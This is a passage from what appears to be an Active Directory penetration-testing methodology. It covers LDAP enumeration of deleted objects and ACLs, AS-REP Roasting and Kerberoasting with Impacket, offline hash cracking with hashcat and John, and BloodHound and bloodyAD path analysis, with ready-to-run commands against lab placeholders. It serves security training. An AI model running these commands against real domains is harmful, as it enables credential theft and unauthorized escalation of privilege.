  -b 'CN=Deleted Objects,<BASE_DN>' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

Example:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analyst@lab.example' \
  -W \
  -b 'CN=Deleted Objects,DC=lab,DC=example' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

This second variant is more specific and normally produces a clearer query by working directly against the deleted-objects container.

The attributes answer different questions:

- `cn` and `distinguishedName` show the deleted object's current name and location; they may include the `DEL` marker and its GUID.
- `msDS-LastKnownRDN` preserves the object's original RDN.
- `lastKnownParent` identifies the container it belonged to before deletion.
- `sAMAccountName` may recover the sign-in name if the attribute was retained.
- `whenChanged` gives the last modification recorded for the object.
- `description`, `info`, and `comment` may preserve notes or administrative context if those attributes survived deletion.

The Show Deleted control displays deleted objects and tombstones, but not objects that have already entered the recycled state. To include recycled objects as well, use control `1.2.840.113556.1.4.2064`, provided the controller supports it and our identity has permission.

Not every attribute survives deletion, and access to this container is often restricted. An empty response therefore does not prove that deleted objects never existed.

### 4.8. Review ACLs and protected attributes

LDAP also exposes security descriptors through `nTSecurityDescriptor`. To interpret this information, distinguish between two concepts:

- **ACE (Access Control Entry):** an individual rule that identifies a user or group and specifies the access allowed, denied, or audited on an object.
- **ACL (Access Control List):** the complete list of ACEs associated with the object.

```text
ACL = list of permissions
ACE = each permission within the list
```

In this methodology, we use ACEs to determine whether an identity we control has permissions that let us continue the chain. Always preserve the complete relationship:

```text
controlled principal -> permission -> target object
```

For example, knowing that an account has `WriteDACL` is not enough: we must identify the user, group, computer, OU, GPO, or domain over which it can exercise that permission. The binary representation is not convenient to interpret directly with `ldapsearch`, so later we will use BloodHound to discover relationships and `bloodyAD` to validate them against the corresponding object.

Depending on our identity's permissions, we may also find protected attributes such as:

- `ms-Mcs-AdmPwd` in legacy LAPS deployments.
- `msLAPS-Password` in Windows LAPS.
- `msDS-ManagedPassword` on gMSA accounts.
- Delegation information such as `msDS-AllowedToDelegateTo` or `msDS-AllowedToActOnBehalfOfOtherIdentity`.

The existence of these attributes does not mean that every user can read their contents. What matters is checking what our identity can query and repeating the check when we obtain different permissions.

**Phase result:** LDIF output and relevant relationships between users, groups, computers, SPNs, trusts, GPOs, ACLs, or deleted objects; add every new user to `users.txt`.

---

## 5. AS-REP Roasting

AS-REP Roasting takes advantage of accounts with Kerberos preauthentication disabled. When we request authentication for one of these identities, the domain controller may return an AS-REP containing data encrypted with a key derived from the user's password. This material allows us to test password candidates offline.

In this phase, we use the `users.txt` file built and updated during the previous enumeration phases.

We will follow this workflow:

1. Verify that `users.txt` contains one account per line.
2. Request AS-REPs for the list without using credentials.
3. Test a specific account directly when necessary.
4. Repeat the query with valid credentials so Impacket can discover vulnerable accounts through LDAP.
5. Save hashes in a Hashcat-compatible format.
6. Test password candidates offline.
7. If we recover a credential, return to the previous phases and enumerate again.

### 5.1. Requirements

To attempt AS-REP Roasting without credentials, we need:

- The DNS domain.
- The domain controller's address.
- Network access to the Kerberos service.
- A user list in `users.txt`.
- At least one account with preauthentication disabled.

We do not need a valid password to test the users in the file. However, the list must contain real names; if `users.txt` is incomplete, a negative result is not conclusive.

Before continuing, verify that the file contains one account per line and has no empty or duplicate entries.

### 5.2. Request AS-REPs without credentials

The basic syntax for testing every account in `users.txt` is:

```bash
impacket-GetNPUsers '<DOMAIN>/' \
  -no-pass \
  -usersfile users.txt \
  -dc-ip <DC_IP> \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

Example:

```bash
impacket-GetNPUsers 'lab.example/' \
  -no-pass \
  -usersfile users.txt \
  -dc-ip 192.0.2.10 \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

The `-outputfile` option tells Impacket to request the AS-REP material and write results directly to `asrep_hashes.txt`. This is cleaner than hiding errors and filtering the tool's entire output through a pipeline.

If an account requires preauthentication, we will not obtain a hash suitable for AS-REP Roasting. If no entry produces a result, preserve the tool's messages: they can help distinguish nonexistent users, restricted accounts, and valid accounts that simply require preauthentication.

### 5.3. Test a specific user

To test a particular identity, specify it directly in the target:

```bash
impacket-GetNPUsers '<DOMAIN>/<USERNAME>' \
  -no-pass \
  -dc-ip <DC_IP> \
  -request \
  -format hashcat \
  -outputfile <HASH_FILE>
```

Example:

```bash
impacket-GetNPUsers 'lab.example/m.garcia' \
  -no-pass \
  -dc-ip 192.0.2.10 \
  -request \
  -format hashcat \
  -outputfile m.garcia_asrep.txt
```

Keep `-no-pass`. If we omit it, Impacket may request a password even though we intend to run an unauthenticated query.

### 5.4. Enumerate vulnerable accounts with credentials

A valid credential changes the workflow. Instead of relying exclusively on `users.txt`, Impacket can query LDAP for users with the `UF_DONT_REQUIRE_PREAUTH` flag and request their AS-REPs.

```bash
impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' \
  -dc-ip <DC_IP> \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

Example:

```bash
impacket-GetNPUsers 'lab.example/analyst:TrainingPass2026' \
  -dc-ip 192.0.2.10 \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

To avoid writing the password in the command, omit it from the target and let Impacket prompt for it interactively:

```bash
impacket-GetNPUsers '<DOMAIN>/<USERNAME>' \
  -dc-ip <DC_IP> \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

Example:

```bash
impacket-GetNPUsers 'lab.example/analyst' \
  -dc-ip 192.0.2.10 \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

This mode does not mean that the authenticated account is vulnerable. Its credentials are used to query the directory for other identities that do not require preauthentication.

### 5.5. Identify the hash format

An RC4-encrypted AS-REP result normally begins like this:

```text
$krb5asrep$23$user@DOMAIN:...
```

The prefix identifies a Kerberos AS-REP with `etype 23`, which corresponds to Hashcat mode `18200`.

Do not confuse it with a hash beginning with `$krb5tgs$23$`. That format is a TGS-REP and uses mode `13100`; it belongs to Kerberoasting and is covered in a separate phase.

If the AS-REP uses `etype 18`, Hashcat provides mode `32200`. Always choose the mode from the prefix and actual hash type, not merely from the technique we intended to run.

### 5.6. Test passwords offline

For an AS-REP using `etype 23`, the basic syntax is:

```bash
hashcat -m 18200 <HASH_FILE> <WORDLIST>
```

Example:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Then display recovered results:

```bash
hashcat -m 18200 <HASH_FILE> --show
```

Example:

```bash
hashcat -m 18200 asrep_hashes.txt --show
```

Cracking occurs offline and does not generate additional domain sign-in attempts. Its effectiveness depends on the password strength and the quality of the wordlist; obtaining the hash does not guarantee that we can recover the password.

### 5.7. Continue after recovering a credential

If we recover a password, add the new identity to the credential inventory and treat it as another enumeration starting point. At a minimum, check again:

- SMB shares and permissions.
- LDAP and visible attributes.
- RPC and the user's groups.
- Access through WinRM or other published services.
- New paths or relationships that were not visible to previous identities.

Recovering the password does not complete the phase. The account's real value lies in the permissions, groups, services, and objects it lets us access.

**Phase result:** an AS-REP hash file and, if cracking succeeds, a new credential with which to repeat enumeration.

---

## 6. Kerberoasting

Kerberoasting involves requesting TGS service tickets for accounts with one or more **Service Principal Names (SPNs)**. Part of the ticket is encrypted with a key derived from the password of the account associated with the service, allowing password candidates to be tested offline.

In most domains, an authenticated user can request tickets for published services. The practical objective is often to find SPNs associated with manually managed user accounts, whose passwords may be weaker than the long, random passwords used by computer accounts.

We will follow this workflow:

1. Use a valid domain identity.
2. Query user accounts that have SPNs.
3. Request and save their TGS tickets.
4. Prioritize targets based on groups, descriptions, and associated services.
5. Identify the hash encryption type.
6. Test password candidates offline.
7. Validate any recovered credential in a controlled manner.
8. Repeat enumeration from the new account's perspective.

### 6.1. Requirements

To perform Kerberoasting, we need:

- A valid, authenticated domain account.
- Its password, NTLM hash, AES key, or a cached TGT.
- Network access to LDAP and Kerberos.
- Correct name resolution for the domain and controller.
- At least one account with a registered SPN.

We do not need to be administrators or know the service account's password. The authenticated identity is used to query LDAP, obtain a TGT, and request the service tickets allowed by Kerberos.

### 6.2. Enumerate SPNs and request tickets with a password

To avoid writing the password in shell history, specify only the domain and user. Impacket prompts for it interactively:

```bash
impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' \
  -dc-ip <DC_IP> \
  -request \
  -outputfile kerberoast_hashes.txt
```

Example:

```bash
impacket-GetUserSPNs 'lab.example/analyst' \
  -dc-ip 192.0.2.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

In a lab, we can also include the password in the target:

```bash
impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' \
  -dc-ip <DC_IP> \
  -request \
  -outputfile kerberoast_hashes.txt
```

Example:

```bash
impacket-GetUserSPNs 'lab.example/analyst:TrainingPass2026' \
  -dc-ip 192.0.2.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

The `-outputfile` option enables ticket requests and saves the material directly in a format compatible with cracking tools.

### 6.3. Request a ticket for a specific account

If the query returns multiple SPNs, target a specific account with `-request-user`:

```bash
impacket-GetUserSPNs '<DOMAIN>/<AUTHENTICATED_USER>' \
  -dc-ip <DC_IP> \
  -request-user <SPN_ACCOUNT> \
  -outputfile <HASH_FILE>
```

Example:

```bash
impacket-GetUserSPNs 'lab.example/analyst' \
  -dc-ip 192.0.2.10 \
  -request-user svc_sql \
  -outputfile svc_sql_tgs.txt
```

The account passed to `-request-user` is the target whose ticket we want; it is not the identity used to authenticate.

### 6.4. Kerberoasting with an NTLM hash

If we have the NTLM hash of a valid account, we can authenticate without knowing its plaintext password:

```bash
impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' \
  -hashes ':<NTHASH>' \
  -dc-ip <DC_IP> \
  -request \
  -outputfile kerberoast_hashes.txt
```

Example:

```bash
impacket-GetUserSPNs 'lab.example/analyst' \
  -hashes ':0123456789abcdef0123456789abcdef' \
  -dc-ip 192.0.2.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

This value must be the hash of the account used to authenticate, not the hash of the service account we want to obtain.

### 6.5. Query another domain through a trust relationship

When a trust exists, `-target-domain` lets us query SPNs in a domain other than that of the authenticated account:

```bash
impacket-GetUserSPNs '<SOURCE_DOMAIN>/<USERNAME>' \
  -hashes ':<NTHASH>' \
  -target-domain <TARGET_DOMAIN> \
  -request \
  -outputfile cross_domain_tgs.txt
```

Example:

```bash
impacket-GetUserSPNs 'lab.example/analyst' \
  -hashes ':0123456789abcdef0123456789abcdef' \
  -target-domain services.example \
  -request \
  -outputfile cross_domain_tgs.txt
```

When using `-target-domain`, GetUserSPNs ignores `-dc-ip` because it must follow Kerberos referrals between the domains. DNS resolution and access to the controllers in both domains must therefore work correctly.

### 6.6. Interpret the results

Before requesting or cracking every ticket indiscriminately, review the information returned by the tool:

- `ServicePrincipalName`: published service.
- `Name`: account associated with the SPN.
- `MemberOf`: known groups for the account.
- `PasswordLastSet`: approximate password age.
- `LastLogon`: activity observed for the account.
- `Delegation`: identified delegation settings.

An account with an administrative name or an SPN tied to a critical function may deserve priority, but the ticket alone does not grant its privileges. We would first need to recover the password and determine what access the identity actually retains.

### 6.7. Identify the ticket format

An RC4-encrypted TGS commonly begins like this:

```text
$krb5tgs$23$*user$DOMAIN$service/host*$...
```

Hashcat modes depend on the etype:

| Prefix or etype | Type | Hashcat mode |
| --- | --- | --- |
| `$krb5tgs$23$` | TGS-REP etype 23 | `13100` |
| `$krb5tgs$17$` | TGS-REP etype 17 | `19600` |
| `$krb5tgs$18$` | TGS-REP etype 18 | `19700` |

Do not use mode `18200`: that mode corresponds to AS-REP etype 23 and belongs to the previous phase.

### 6.8. Test passwords offline

#### Hashcat

For a TGS using etype 23, the basic syntax is:

```bash
hashcat -m 13100 <HASH_FILE> <WORDLIST>
```

Example:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

To display recovered results:

```bash
hashcat -m 13100 <HASH_FILE> --show
```

Example:

```bash
hashcat -m 13100 kerberoast_hashes.txt --show
```

#### John the Ripper

```bash
john --wordlist=<WORDLIST> <HASH_FILE>
```

Example:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

To display results:

```bash
john --show <HASH_FILE>
```

Example:

```bash
john --show kerberoast_hashes.txt
```

Cracking is offline and does not generate additional authentication attempts against the domain. Obtaining a ticket does not guarantee that the password is weak enough for our strategy to recover it.

### 6.9. Validate a recovered credential

If we recover a password, do not automatically connect to every service. First identify the published protocols and validate the account in a controlled manner.

We can begin with the services discovered during enumeration:

- SMB for shares and permissions.
- LDAP for groups, attributes, and relationships.
- RPC for additional account information.
- WinRM if the service is available.
- SSH only if it was identified on the target and is within scope.

A service account may reuse the same password across systems, but we should neither assume this nor launch indiscriminate tests. Tie every validation to a known service and target.

**Phase result:** accounts with SPNs, saved TGS tickets, and any recovered credentials ready for validation and domain re-enumeration.

---

## 7. Path analysis with BloodHound

BloodHound enters the methodology once we have a valid user, have repeated RPC, SMB, and LDAP enumeration, have reviewed Kerberos, and still cannot find a clear path forward.

It does not replace manual enumeration. Its purpose is to turn users, groups, computers, sessions, permissions, GPOs, delegations, and trust relationships into a graph that helps us identify connections that are difficult to recognize in text output.

We will follow this workflow:

1. Collect domain data with a valid identity.
2. Import the ZIP file into BloodHound.
3. Mark the identities and computers we control.
4. Search for paths to higher-value targets.
5. Review relationships originating from our controlled objects first.
6. Validate each edge manually before attempting to use it.
7. Repeat collection whenever our position in the domain changes.

### 7.1. When to use BloodHound

We do not need to wait until we are completely blocked to collect data, but BloodHound provides the most value once we can answer these questions:

- Which user do we control?
- Which groups does the user belong to?
- Which shares and services can the user access?
- Which objects can the user read or modify through LDAP?
- Have we found service accounts, delegations, or trust relationships?

If we know these pieces separately but cannot see how they connect, it is time to use the graph.

### 7.2. Collect data with `bloodhound-ce-python`

With a valid account, we can collect information from our own system. The basic syntax is:

```bash
bloodhound-ce-python \
  -u '<USERNAME>' \
  -p '<PASSWORD>' \
  -d '<DOMAIN>' \
  -ns <DC_IP> \
  -dc '<DC_FQDN>' \
  -c All \
  --zip
```

Example:

```bash
bloodhound-ce-python \
  -u 'analyst' \
  -p 'TrainingPass2026' \
  -d 'lab.example' \
  -ns 192.0.2.10 \
  -dc 'dc01.lab.example' \
  -c All \
  --zip
```

The arguments serve these purposes:

- `-u` and `-p` specify the identity used for collection.
- `-d` defines the queried domain.
- `-ns` uses the controller as the DNS server.
- `-dc` specifies the domain controller's FQDN.
- `-c All` collects all supported relationships except the privileged `LoggedOn` collection method.
- `--zip` compresses the generated JSON files.

The name resolution configured in phase 1 is important again: `-dc` must receive a name that resolves correctly.

#### Collection limited to the controller

If we can only communicate with the domain controller or want to begin with a narrower collection, use `DCOnly`:

```bash
bloodhound-ce-python \
  -u '<USERNAME>' \
  -p '<PASSWORD>' \
  -d '<DOMAIN>' \
  -ns <DC_IP> \
  -dc '<DC_FQDN>' \
  -c DCOnly \
  --zip
```

Example:

```bash
bloodhound-ce-python \
  -u 'analyst' \
  -p 'TrainingPass2026' \
  -d 'lab.example' \
  -ns 192.0.2.10 \
  -dc 'dc01.lab.example' \
  -c DCOnly \
  --zip
```

`DCOnly` queries the controller for groups, ACLs, trusts, object properties, and containers, but it does not obtain relationships that require communication with member computers, such as certain sessions or local groups.

### 7.3. Alternative with SharpHound

If we are already working from a domain-joined Windows computer, SharpHound is the official BloodHound CE collector. There is no need to document transfer or connection setup here: run the collection from an authorized location and preserve the resulting ZIP.

```powershell
.\SharpHound.exe -c All
```

SharpHound generates JSON files and compresses them into a ZIP ready for import. Record which user performed the collection, from which computer, and which methods were used.

### 7.4. Import the data

Once the ZIP has been generated, import it through BloodHound's file-ingestion option. We do not need to extract it manually: BloodHound CE accepts the compressed file produced by the collector.

The ZIP contains sensitive information about the domain structure and permissions. Store it as assessment evidence and do not share it outside the authorized scope.

### 7.5. Mark our starting position

Before searching for paths, accurately represent what we already control:

- Mark as `Owned` every user whose password, hash, or ticket we control.
- Mark compromised computers when we have effective control over them.
- Mark as high-value targets only those objects genuinely relevant to the assessment.

BloodHound can calculate useful paths only when our starting point reflects the real situation. Marking an account as controlled merely because we know its name would produce incorrect conclusions.

### 7.6. Analyze the graph in a natural order

Instead of looking only for the shortest path to `Domain Admins`, review the graph in this order:

1. Outbound relationships from users we control.
2. Their direct and nested groups.
3. Permissions over other users, groups, computers, OUs, and GPOs.
4. Local access, RDP, WinRM, DCOM, or sessions on computers.
5. Kerberos delegations and related service accounts.
6. Trust relationships with other domains.
7. Paths to objects marked `High Value`.

Relationships that may appear include:

- `GenericAll` or `GenericWrite`.
- `WriteDACL` or `WriteOwner`.
- The ability to change another user's password.
- The ability to add members to a group.
- Local administration over a computer.
- Permission to use RDP or remote administration.
- Control over a GPO or OU.
- Delegations and relationships involving AD CS.

A relationship name is not enough to decide what to do. We must determine which object it applies to, what capability it grants, and whether it remains valid from our current position.

### 7.7. Validate paths manually

An edge in the graph represents information collected at a particular moment. It may be incomplete, outdated, or dependent on additional conditions.

Before following a path, validate:

- That the controlled identity remains valid.
- That the permission truly exists on the indicated object.
- That the computer or service is reachable.
- That the associated technique is compatible with the object type.
- That the action is permitted by the scope.

For example, `GenericWrite` does not represent a single action. Its usefulness changes depending on whether the target is a user, group, computer account, or GPO. BloodHound shows the relationship; we must interpret its context.

### 7.8. Validate ACLs and ACEs with `bloodyAD`

BloodHound helps represent relationships and discover paths, but it should not be our only source of truth. The graph depends on the data the collector could obtain, the methods used, and when collection occurred. A path ending at a particular user therefore does not necessarily prove that the account has no other permissions.

If we come to control a user and BloodHound no longer shows a path forward, manually review which objects that identity can modify. `bloodyAD` can help detect writable objects and request `nTSecurityDescriptor` through LDAP, resolving its ACEs into a readable format. This review also lets us directly confirm a relationship that does appear in the graph.

#### Find objects writable by the current identity

As an initial review, request objects over which the authenticated user has relevant rights:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' \
  get writable --otype ALL --right ALL --detail
```

Example:

```bash
bloodyAD --host 192.0.2.10 -d lab.example -u operator -p 'Password123!' \
  get writable --otype ALL --right ALL --detail
```

Treat the output as a new starting point: identify the object, the right, and the specific property affected. Then query its ACL to confirm the complete relationship and determine whether it genuinely offers a valid path forward.

#### Query the ACL of the domain root

The following command queries only the security descriptor of the domain object:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' \
  get search --filter "(objectClass=domain)" --base "<BASE_DN>" \
  --attr nTSecurityDescriptor --resolve-sd
```

Example:

```bash
bloodyAD --host 192.0.2.10 -d lab.example -u operator -p 'Password123!' \
  get search --filter "(objectClass=domain)" --base "DC=lab,DC=example" \
  --attr nTSecurityDescriptor --resolve-sd
```

This query lets us examine the ACEs applied to the domain root. If a user or group name appears in the output, it acts as the *trustee* of an ACE on that object; this does not prove that it has the same permission over every object in the directory.

#### Query the ACL of a target object

To validate a relationship involving a user, group, computer, or other object, adjust the filter to select that specific target.

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' \
  get search --filter "(&(objectClass=<CLASS>)(sAMAccountName=<TARGET>))" \
  --base "<BASE_DN>" --attr distinguishedName,nTSecurityDescriptor --resolve-sd
```

Example for a group:

```bash
bloodyAD --host 192.0.2.10 -d lab.example -u operator -p 'Password123!' \
  get search --filter "(&(objectClass=group)(sAMAccountName=IT-Support))" \
  --base "DC=lab,DC=example" \
  --attr distinguishedName,nTSecurityDescriptor --resolve-sd
```

Example for a user:

```bash
bloodyAD --host 192.0.2.10 -d lab.example -u operator -p 'Password123!' \
  get search --filter "(&(objectClass=user)(sAMAccountName=target.user))" \
  --base "DC=lab,DC=example" \
  --attr distinguishedName,nTSecurityDescriptor --resolve-sd
```

Including `distinguishedName` in the output helps confirm that we are inspecting the correct object, especially when similar names exist.

#### Filter by the principal we control

After confirming the target object, narrow the output by searching for the user or group BloodHound identified as the relationship's source:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' \
  get search --filter "(&(objectClass=<CLASS>)(sAMAccountName=<TARGET>))" \
  --base "<BASE_DN>" --attr distinguishedName,nTSecurityDescriptor --resolve-sd \
  | grep -B1 -A4 '<CONTROLLED_PRINCIPAL>'
```

Filtering helps locate an ACE within lengthy output, but review adjacent lines as well so that the `Trustee`, `Right`, `ObjectType`, inheritance conditions, and whether the entry allows or denies access remain together.

Output may have a structure similar to this:

```text
nTSecurityDescriptor.ACL.3.Type: == ALLOWED_OBJECT ==
nTSecurityDescriptor.ACL.3.Trustee: LAB\operator
nTSecurityDescriptor.ACL.3.Right: WRITE_DACL
nTSecurityDescriptor.ACL.3.ObjectType: Self
```

In `bloodyAD` output, `Self` refers to the object whose descriptor we are querying. In this example, `operator` has `WRITE_DACL` over the target object returned by the query; it does not mean that the permission applies to the operator's own account.

#### Interpret the main permissions

| Observed right | Meaning on the target object | Potential relevance |
| --- | --- | --- |
| `GENERIC_READ` or `READ_PROP` | Allows the object or specific attributes to be read. | May reveal sensitive information, although it does not imply direct modification. |
| `WRITE_PROP` | Allows a property or property set identified by `ObjectType` to be modified. | Its effect depends on the specific attribute, such as membership, SPNs, or delegation properties. |
| `GENERIC_WRITE` | Combines several write permissions over the target. | May enable different techniques depending on whether the target is a user, group, computer, OU, or GPO. |
| `GENERIC_ALL` | Grants broad control over the object. | May allow attributes, memberships, or credentials to be modified depending on the target type. |
| `WRITE_DACL` | Allows the object's DACL to be modified. | May be used to grant another identity an additional permission over that target. |
| `WRITE_OWNER` | Allows ownership of the object to be assumed. | Ownership may subsequently make it easier to modify the DACL. |
| `CONTROL_ACCESS` | Represents an extended right defined by `ObjectType`. | Must be interpreted together with the specific right, such as object replication or restoration. |
| `CONTROL_ACCESS` + `Reanimate-Tombstones` | Grants the extended right to restore deleted objects within the naming context to which the ACE applies. | May allow recovery of a deleted object if it remains restorable; it does not automatically grant read access to all its attributes. |
| `== DENIED ==` | The ACE explicitly denies the specified access. | Requires reviewing effective access, ACE order, and group membership. |

Effective permissions may also come from nested groups or inherited ACEs. A text match alone is therefore not enough to claim that a technique will work.

#### Validate the complete relationship

Before continuing, we should be able to state and confirm the entire relationship:

```text
operator → WriteDACL → IT-Support group
```

To treat it as valid, verify:

1. That we truly control the source principal.
2. That the query returns exactly the expected target object.
3. That the ACE allows the right and is not merely an audit or deny entry.
4. That `ObjectType` and inheritance conditions make the permission applicable to the target.
5. That the resulting action is within the assessment scope.

Only then should we choose a technique compatible with the confirmed object type and permission. This prevents us from interpreting a BloodHound relationship as an automatic exploitation capability.

### 7.9. Collect again when access changes

ACLs and memberships usually change infrequently, but user sessions are dynamic. A new account may also reveal information the previous identity could not query.

Repeat or supplement collection when:

- We recover another credential.
- We compromise an additional computer.
- We need to refresh sessions.
- We access another domain through a trust.
- We detect that relationships required to validate a hypothesis are missing.

Preserve each ZIP with a date and the identity used so that collections can be distinguished and old data is not analyzed as though it were current.

**Phase result:** a collection ZIP, correctly marked `Owned` objects, and manually validated potential paths.

---

## Download the methodology commands

Now that we understand the purpose of each phase, we can download the following `.md` file as a quick reference containing the organized commands without explanations.

<a href="https://drive.google.com/file/d/1FFjup1TO0D3OEcEY6lBmvybwuNSIsWdp/view?usp=sharing" target="_blank" rel="noopener noreferrer">
  Open and download the Active Directory commands (.md)
</a>
